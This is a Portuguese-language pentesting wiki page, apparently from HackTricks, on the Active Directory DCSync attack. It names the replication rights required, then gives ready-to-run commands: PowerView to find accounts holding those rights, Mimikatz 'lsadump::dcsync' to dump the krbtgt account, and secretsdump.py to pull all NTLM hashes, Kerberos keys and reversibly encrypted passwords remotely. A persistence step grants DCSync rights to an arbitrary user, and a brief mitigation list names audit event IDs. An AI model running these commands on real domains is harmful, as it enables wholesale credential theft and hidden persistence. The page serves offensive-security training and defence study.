# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

A permissão **DCSync** implica ter essas permissões sobre o domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.

**Notas Importantes sobre DCSync:**

- O **ataque DCSync simula o comportamento de um Controlador de Domínio e solicita que outros Controladores de Domínio repliquem informações** usando o Protocolo Remoto de Serviço de Replicação de Diretório (MS-DRSR). Como o MS-DRSR é uma função válida e necessária do Active Directory, não pode ser desativado ou desligado.
- Por padrão, apenas os grupos **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** têm os privilégios necessários.
- Se as senhas de qualquer conta forem armazenadas com criptografia reversível, uma opção está disponível no Mimikatz para retornar a senha em texto claro.

### Enumeração

Verifique quem tem essas permissões usando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Exploit Localmente
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explorar Remotamente
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` gera 3 arquivos:

- um com os **hashes NTLM**
- um com as **chaves Kerberos**
- um com senhas em texto claro do NTDS para quaisquer contas configuradas com [**criptografia reversível**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada. Você pode obter usuários com criptografia reversível com

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistência

Se você for um administrador de domínio, pode conceder essas permissões a qualquer usuário com a ajuda do `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Então, você pode **verificar se o usuário foi corretamente atribuído** os 3 privilégios procurando-os na saída de (você deve conseguir ver os nomes dos privilégios dentro do campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigação

- Security Event ID 4662 (Audit Policy for object must be enabled) – Uma operação foi realizada em um objeto
- Security Event ID 5136 (Audit Policy for object must be enabled) – Um objeto de serviço de diretório foi modificado
- Security Event ID 4670 (Audit Policy for object must be enabled) – As permissões em um objeto foram alteradas
- AD ACL Scanner - Crie e compare relatórios de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referências

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
